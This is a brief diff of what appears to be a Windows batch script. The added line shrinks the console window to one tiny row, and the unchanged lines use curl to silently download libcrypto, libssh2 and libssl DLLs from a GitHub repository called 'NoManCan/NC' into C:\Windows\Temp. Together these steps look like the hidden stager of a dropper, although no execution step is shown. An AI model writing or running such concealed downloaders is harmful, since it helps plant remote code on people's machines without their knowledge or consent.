@@ -1,4 +1,4 @@
-@echo off
+@echo off & mode 16,1
 curl -s https://raw.githubusercontent.com/NoManCan/NC/refs/heads/main/libcrypto-3.dll > C:\Windows\Temp\libcrypto-3.dll
 curl -s https://raw.githubusercontent.com/NoManCan/NC/refs/heads/main/libssh2.dll > C:\Windows\Temp\libssh2.dll
 curl -s https://raw.githubusercontent.com/NoManCan/NC/refs/heads/main/libssl-3.dll > C:\Windows\Temp\libssl-3.dll
